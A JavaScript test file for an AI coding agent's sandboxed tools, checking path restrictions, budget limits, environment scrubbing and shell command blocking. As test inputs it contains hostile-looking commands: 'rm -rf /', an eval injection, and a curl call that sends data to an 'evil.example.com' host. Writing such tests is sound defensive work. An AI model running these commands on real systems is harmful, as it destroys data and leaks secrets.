import { describe, it, beforeEach, afterEach } from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs";
import path from "node:path";
import os from "node:os";

import { fileRead, FileReadError } from "../src/agents/jules/tools/file-read.js";
import { grep, GrepError } from "../src/agents/jules/tools/grep.js";
import { glob, GlobError } from "../src/agents/jules/tools/glob.js";
import {
  shell,
  analyzeCommand,
  buildScrubbedEnv,
  ShellBlockedError,
} from "../src/agents/jules/tools/shell.js";
import { fileEdit, FileEditError } from "../src/agents/jules/tools/file-edit.js";
import {
  dispatchTool,
  createAgentContext,
  BudgetExhaustedError,
  isReadOnlyTool,
  listTools,
} from "../src/agents/jules/tools/dispatch.js";

// ── Helpers ──────────────────────────────────────────────────────────

let tmpDir;

function setup() {
  tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), "jules-tools-test-"));
}

function teardown() {
  try {
    fs.rmSync(tmpDir, { recursive: true, force: true });
  } catch { /* best effort */ }
}

function writeFile(name, content) {
  const filePath = path.join(tmpDir, name);
  fs.mkdirSync(path.dirname(filePath), { recursive: true });
  fs.writeFileSync(filePath, content, "utf-8");
  return filePath;
}

// ── FileRead ─────────────────────────────────────────────────────────

describe("fileRead", () => {
  beforeEach(setup);
  afterEach(teardown);

  it("reads a file with line numbers", () => {
    const fp = writeFile("hello.js", "const a = 1;\nconst b = 2;\nconst c = 3;\n");
    const result = fileRead({ file_path: fp });
    assert.equal(result.numLines, 4);
    assert.equal(result.startLine, 1);
    assert.equal(result.totalLines, 4);
    assert.equal(result.binary, false);
    assert.ok(result.content.includes("1\tconst a = 1;"));
    assert.ok(result.content.includes("2\tconst b = 2;"));
  });

  it("respects offset and limit", () => {
    const lines = Array.from({ length: 100 }, (_, i) => `line ${i + 1}`).join("\n");
    const fp = writeFile("big.txt", lines);
    const result = fileRead({ file_path: fp, offset: 10, limit: 5 });
    assert.equal(result.startLine, 11);
    assert.equal(result.numLines, 5);
    assert.ok(result.content.includes("11\tline 11"));
    assert.ok(result.content.includes("15\tline 15"));
  });

  it("detects binary files", () => {
    const fp = writeFile("image.png", "fake binary");
    const result = fileRead({ file_path: fp });
    assert.equal(result.binary, true);
    assert.ok(result.content.includes("[Binary file"));
  });

  it("throws on missing file", () => {
    assert.throws(
      () => fileRead({ file_path: path.join(tmpDir, "nope.js") }),
      FileReadError,
    );
  });

  it("throws on empty file_path", () => {
    assert.throws(() => fileRead({ file_path: "" }), FileReadError);
  });

  it("blocks UNC paths", () => {
    assert.throws(
      () => fileRead({ file_path: "\\\\evil-server\\share\\file.txt" }),
      FileReadError,
    );
  });

  it("blocks symlink escapes outside allowed root", (t) => {
    const allowedRoot = path.join(tmpDir, "workspace");
    const outsideRoot = path.join(tmpDir, "outside");
    fs.mkdirSync(allowedRoot, { recursive: true });
    fs.mkdirSync(outsideRoot, { recursive: true });

    const outsideFile = path.join(outsideRoot, "secret.txt");
    fs.writeFileSync(outsideFile, "secret=1\n", "utf-8");
    const symlinkPath = path.join(allowedRoot, "linked-secret.txt");

    try {
      fs.symlinkSync(
        outsideFile,
        symlinkPath,
        process.platform === "win32" ? "file" : undefined,
      );
    } catch (error) {
      if (["EPERM", "EACCES", "EINVAL", "UNKNOWN"].includes(error.code)) {
        t.skip(`Symlink creation not permitted in this environment (${error.code}).`);
        return;
      }
      throw error;
    }

    assert.throws(
      () => fileRead({ file_path: symlinkPath, allowed_root: allowedRoot }),
      (error) =>
        error instanceof FileReadError &&
        error.message.includes("PATH_OUTSIDE_ALLOWED_ROOT"),
    );
  });
});

// ── Grep ─────────────────────────────────────────────────────────────

describe("grep", () => {
  beforeEach(setup);
  afterEach(teardown);

  it("finds pattern matches in files", () => {
    writeFile("a.js", "const foo = 1;\nconst bar = 2;\n");
    writeFile("b.js", "const foo = 3;\n");
    const result = grep({ pattern: "foo", path: tmpDir });
    assert.ok(result.numFiles >= 1);
    assert.ok(result.numMatches >= 1);
  });

  it("returns zero matches for non-existent pattern", () => {
    writeFile("a.js", "hello world\n");
    const result = grep({ pattern: "zzz_nonexistent_zzz", path: tmpDir });
    assert.equal(result.numMatches, 0);
    assert.equal(result.numFiles, 0);
  });

  it("throws on missing pattern", () => {
    assert.throws(() => grep({ pattern: "" }), GrepError);
  });
});

// ── Glob ─────────────────────────────────────────────────────────────

describe("glob", () => {
  beforeEach(setup);
  afterEach(teardown);

  it("finds files by extension pattern", () => {
    writeFile("a.tsx", "export default function A() {}");
    writeFile("b.tsx", "export default function B() {}");
    writeFile("c.js", "module.exports = {}");
    const result = glob({ pattern: "*.tsx", path: tmpDir });
    assert.equal(result.numFiles, 2);
    assert.ok(result.filenames.every((f) => f.endsWith(".tsx")));
  });

  it("returns empty for non-matching pattern", () => {
    writeFile("a.js", "hello");
    const result = glob({ pattern: "*.py", path: tmpDir });
    assert.equal(result.numFiles, 0);
  });

  it("respects result limit", () => {
    for (let i = 0; i < 10; i++) writeFile(`file${i}.txt`, `content ${i}`);
    const result = glob({ pattern: "*.txt", path: tmpDir, limit: 3 });
    assert.equal(result.numFiles, 3);
    assert.equal(result.truncated, true);
  });

  it("throws on non-existent directory", () => {
    assert.throws(
      () => glob({ pattern: "*", path: path.join(tmpDir, "nope") }),
      GlobError,
    );
  });
});

// ── Shell ────────────────────────────────────────────────────────────

describe("shell", () => {
  it("executes a simple command", () => {
    const result = shell({ command: "echo hello" });
    assert.equal(result.exitCode, 0);
    assert.ok(result.stdout.includes("hello"));
    assert.equal(result.security.risk, "safe");
  });

  it("captures non-zero exit codes", () => {
    const result = shell({ command: "node -e \"process.exit(42)\"" });
    assert.equal(result.exitCode, 42);
  });

  it("blocks dangerous commands", () => {
    assert.throws(
      () => shell({ command: "rm -rf /" }),
      ShellBlockedError,
    );
  });

  it("blocks eval injection", () => {
    assert.throws(
      () => shell({ command: "eval(require('child_process'))" }),
      ShellBlockedError,
    );
  });

  it("warns on package install", () => {
    const analysis = analyzeCommand("npm install express");
    assert.equal(analysis.risk, "warn");
    assert.ok(analysis.patterns.some((p) => p.desc === "package install"));
  });

  it("blocks curl when host is not allowlisted", () => {
    const analysis = analyzeCommand("curl https://evil.example.com/leak");
    assert.equal(analysis.risk, "blocked");
    assert.ok(analysis.patterns.some((p) => p.desc.includes("network host not allowlisted")));
  });

  it("allows curl for default allowlisted hosts", () => {
    const analysis = analyzeCommand("curl https://github.com/mrrCarter/create-sentinelayer");
    assert.equal(analysis.risk, "warn");
    assert.ok(analysis.patterns.some((p) => p.desc === "network request"));
    assert.equal(analysis.networkPolicy.blocking, false);
  });

  it("blocks curl commands without explicit URL hosts", () => {
    const analysis = analyzeCommand("curl $TARGET_URL");
    assert.equal(analysis.risk, "blocked");
    assert.ok(
      analysis.patterns.some((p) => p.desc.includes("requires explicit URL host")),
    );
  });

  it("supports custom allowlist entries with strict wildcard boundaries", () => {
    const allowed = analyzeCommand("curl https://api.trusted.acme.local/path", {
      env: {
        SENTINELAYER_ALLOWED_FETCH_HOSTS: "*.trusted.acme.local",
      },
    });
    assert.equal(allowed.risk, "warn");

    const blocked = analyzeCommand("curl https://eviltrusted.acme.local/path", {
      env: {
        SENTINELAYER_ALLOWED_FETCH_HOSTS: "*.trusted.acme.local",
      },
    });
    assert.equal(blocked.risk, "blocked");
    assert.ok(
      blocked.patterns.some((p) => p.desc.includes("network host not allowlisted")),
    );
  });

  it("scrubs sensitive env vars from child process", () => {
    const scrubbed = buildScrubbedEnv({
      OPENAI_API_KEY: "openai-secret",
      GH_TOKEN: "github-secret",
      CUSTOM_SERVICE_TOKEN: "token-secret",
      WORKER_PRIVATE_KEY: "private-secret",
      INPUT_OPENAI_API_KEY: "input-secret",
      SAFE_FLAG: "keep-me",
    });

    assert.equal(scrubbed.OPENAI_API_KEY, undefined);
    assert.equal(scrubbed.GH_TOKEN, undefined);
    assert.equal(scrubbed.CUSTOM_SERVICE_TOKEN, undefined);
    assert.equal(scrubbed.WORKER_PRIVATE_KEY, undefined);
    assert.equal(scrubbed.INPUT_OPENAI_API_KEY, undefined);
    assert.equal(scrubbed.SAFE_FLAG, "keep-me");
  });

  it("shell command execution receives scrubbed environment", () => {
    const prevOpenAi = process.env.OPENAI_API_KEY;
    const prevSafe = process.env.SL_SAFE_TEST;
    process.env.OPENAI_API_KEY = "sensitive";
    process.env.SL_SAFE_TEST = "safe";
    try {
      const result = shell({
        command:
          "node -e \"const p=process.env; process.stdout.write((p.OPENAI_API_KEY||'missing') + ',' + (p.SL_SAFE_TEST||'missing'))\"",
      });
      assert.equal(result.exitCode, 0);
      assert.equal(result.stdout.trim(), "missing,safe");
    } finally {
      if (prevOpenAi === undefined) {
        delete process.env.OPENAI_API_KEY;
      } else {
        process.env.OPENAI_API_KEY = prevOpenAi;
      }
      if (prevSafe === undefined) {
        delete process.env.SL_SAFE_TEST;
      } else {
        process.env.SL_SAFE_TEST = prevSafe;
      }
    }
  });
});

// ── FileEdit ─────────────────────────────────────────────────────────

describe("fileEdit", () => {
  beforeEach(setup);
  afterEach(teardown);

  it("replaces a unique string", () => {
    const fp = writeFile("edit-me.js", "const x = 1;\nconst y = 2;\n");
    const result = fileEdit({
      file_path: fp,
      old_string: "const x = 1;",
      new_string: "const x = 42;",
      allowed_root: tmpDir,
    });
    assert.equal(result.occurrencesReplaced, 1);
    assert.ok(result.diff.includes("-const x = 1;"));
    assert.ok(result.diff.includes("+const x = 42;"));

    const content = fs.readFileSync(fp, "utf-8");
    assert.ok(content.includes("const x = 42;"));
    assert.ok(!content.includes("const x = 1;"));
  });

  it("errors on non-unique string without replace_all", () => {
    const fp = writeFile("dup.js", "foo\nfoo\nfoo\n");
    assert.throws(
      () => fileEdit({
        file_path: fp,
        old_string: "foo",
        new_string: "bar",
        allowed_root: tmpDir,
      }),
      FileEditError,
    );
  });

  it("replaces all with replace_all flag", () => {
    const fp = writeFile("dup.js", "foo\nfoo\nfoo\n");
    const result = fileEdit({
      file_path: fp,
      old_string: "foo",
      new_string: "bar",
      replace_all: true,
      allowed_root: tmpDir,
    });
    assert.equal(result.occurrencesReplaced, 3);
    const content = fs.readFileSync(fp, "utf-8");
    assert.ok(!content.includes("foo"));
    assert.equal(content.split("bar").length - 1, 3);
  });

  it("blocks edits outside allowed root", () => {
    const fp = writeFile("safe.js", "content");
    assert.throws(
      () => fileEdit({
        file_path: fp,
        old_string: "content",
        new_string: "hacked",
        allowed_root: "/some/other/directory",
      }),
      FileEditError,
    );
  });

  it("errors when old_string not found", () => {
    const fp = writeFile("miss.js", "hello world");
    assert.throws(
      () => fileEdit({
        file_path: fp,
        old_string: "nonexistent",
        new_string: "replacement",
        allowed_root: tmpDir,
      }),
      FileEditError,
    );
  });

  it("blocks UNC paths", () => {
    assert.throws(
      () => fileEdit({
        file_path: "\\\\evil-server\\share\\edit.js",
        old_string: "a",
        new_string: "b",
        allowed_root: tmpDir,
      }),
      (error) =>
        error instanceof FileEditError &&
        error.message.includes("PATH_UNC_BLOCKED"),
    );
  });

  it("blocks symlink escapes outside allowed root", (t) => {
    const allowedRoot = path.join(tmpDir, "workspace");
    const outsideRoot = path.join(tmpDir, "outside");
    fs.mkdirSync(allowedRoot, { recursive: true });
    fs.mkdirSync(outsideRoot, { recursive: true });

    const outsideFile = path.join(outsideRoot, "target.js");
    fs.writeFileSync(outsideFile, "const token = 'outside';\n", "utf-8");
    const symlinkPath = path.join(allowedRoot, "target.js");

    try {
      fs.symlinkSync(
        outsideFile,
        symlinkPath,
        process.platform === "win32" ? "file" : undefined,
      );
    } catch (error) {
      if (["EPERM", "EACCES", "EINVAL", "UNKNOWN"].includes(error.code)) {
        t.skip(`Symlink creation not permitted in this environment (${error.code}).`);
        return;
      }
      throw error;
    }

    assert.throws(
      () => fileEdit({
        file_path: symlinkPath,
        old_string: "outside",
        new_string: "inside",
        allowed_root: allowedRoot,
      }),
      (error) =>
        error instanceof FileEditError &&
        error.message.includes("PATH_OUTSIDE_ALLOWED_ROOT"),
    );
  });

  it("blocks sibling prefix collision paths outside allowed root", () => {
    const allowedRoot = path.join(tmpDir, "workspace");
    fs.mkdirSync(allowedRoot, { recursive: true });
    const siblingPath = writeFile("workspace-evil/sneaky.js", "const sneaky = true;\n");

    assert.throws(
      () => fileEdit({
        file_path: siblingPath,
        old_string: "true",
        new_string: "false",
        allowed_root: allowedRoot,
      }),
      (error) =>
        error instanceof FileEditError &&
        error.message.includes("PATH_OUTSIDE_ALLOWED_ROOT"),
    );
  });
});

// ── Dispatch ─────────────────────────────────────────────────────────

describe("dispatchTool", () => {
  beforeEach(setup);
  afterEach(teardown);

  it("dispatches FileRead through budget gate", async () => {
    const fp = writeFile("dispatch-test.js", "line 1\nline 2\n");
    const ctx = createAgentContext({
      agentIdentity: { id: "frontend", persona: "Jules Tanaka" },
      budget: { maxToolCalls: 10 },
    });

    const result = await dispatchTool("FileRead", { file_path: fp }, ctx);
    assert.equal(result.numLines, 3);
    assert.equal(ctx.usage.toolCalls, 1);
  });

  it("stops when budget exhausted", async () => {
    const fp = writeFile("budget-test.js", "content");
    const ctx = createAgentContext({
      agentIdentity: { id: "frontend", persona: "Jules Tanaka" },
      budget: { maxToolCalls: 1 },
    });

    // First call succeeds (uses 1 of 1)
    await dispatchTool("FileRead", { file_path: fp }, ctx);
    assert.equal(ctx.usage.toolCalls, 1);

    // Second call should blow the budget (1 + 1 > 1)
    await assert.rejects(
      async () => dispatchTool("FileRead", { file_path: fp }, ctx),
      (err) => err instanceof BudgetExhaustedError,
    );
  });

  it("emits events via onEvent callback", async () => {
    const fp = writeFile("event-test.js", "hello");
    const events = [];
    const ctx = createAgentContext({
      agentIdentity: { id: "frontend", persona: "Jules Tanaka" },
      budget: { maxToolCalls: 10 },
      onEvent: (e) => events.push(e),
    });

    await dispatchTool("FileRead", { file_path: fp }, ctx);
    assert.ok(events.some((e) => e.event === "tool_call"));
    assert.ok(events.some((e) => e.event === "tool_result"));
    assert.ok(events.every((e) => e.agent.persona === "Jules Tanaka"));
  });

  it("tracks read-only tool classification", () => {
    assert.equal(isReadOnlyTool("FileRead"), true);
    assert.equal(isReadOnlyTool("Grep"), true);
    assert.equal(isReadOnlyTool("Glob"), true);
    assert.equal(isReadOnlyTool("Shell"), false);
    assert.equal(isReadOnlyTool("FileEdit"), false);
  });

  it("lists available tools", () => {
    const tools = listTools();
    assert.ok(tools.includes("FileRead"));
    assert.ok(tools.includes("Grep"));
    assert.ok(tools.includes("Glob"));
    assert.ok(tools.includes("Shell"));
    assert.ok(tools.includes("FileEdit"));
  });
});
